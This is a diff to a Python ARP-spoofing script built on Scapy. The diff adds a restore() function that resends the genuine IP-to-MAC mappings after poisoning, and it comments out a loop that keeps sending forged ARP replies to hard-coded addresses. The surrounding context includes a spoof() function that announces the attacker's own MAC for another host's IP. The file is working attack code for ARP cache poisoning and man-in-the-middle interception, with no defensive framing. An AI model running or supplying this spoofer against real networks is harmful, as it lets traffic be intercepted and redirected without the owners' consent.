@@ -54,6 +54,26 @@ def spoof(target_ip, host_ip, verbose=True):
 		# get the MAC address of the default interface we are using
 		self_mac = ARP().hwsrc
 		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac))
+
+def restore(target_ip, host_ip, verbose=True):
+	"""
+	Restores the normal process of a regular network
+	This is done by sending the original informations
+	(real IP and MAC of 'host_ip' ) to 'target_ip'
+	"""
+	# get the real MAC address of target
+	target_mac = get_mac(target_ip)
+	# get the real MAC address of spoofed (gateway, i.e router)
+	host_mac = get_mac(host_ip)
+	# crafting the restoring packet
+	arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
+	# sending the restoring packet
+	# to restore the network to its normal process
+	# we send each reply seven times for a good measure (count=7)
+	send(arp_response, verbose=0, count=7)
+	if verbose:
+		print("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac))
+
 def get_mac_address():
 	import uuid
 	# after each 2 digits, join elements of getnode().
@@ -85,12 +105,12 @@ def sendPackets(gateway_ip, target_ip, this_mac_address, target_mac_address):
 
 	broadcast()
 
-try:
-	while True:
-		sendPackets("1.1.1.1", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
-except KeyboardInterrupt:
-	rearp = 0
-	while rearp != 10:
-		sendPackets("10.1.9.135", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
-		time.sleep(0.1)
-		rearp += 1
+# try:
+# 	while True:
+# 		sendPackets("1.1.1.1", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
+# except KeyboardInterrupt:
+# 	rearp = 0
+# 	while rearp != 10:
+# 		sendPackets("10.1.9.135", "10.1.9.135", get_mac_address(), "e0:ac:cb:71:d5:c6")
+# 		time.sleep(0.1)
+# 		rearp += 1
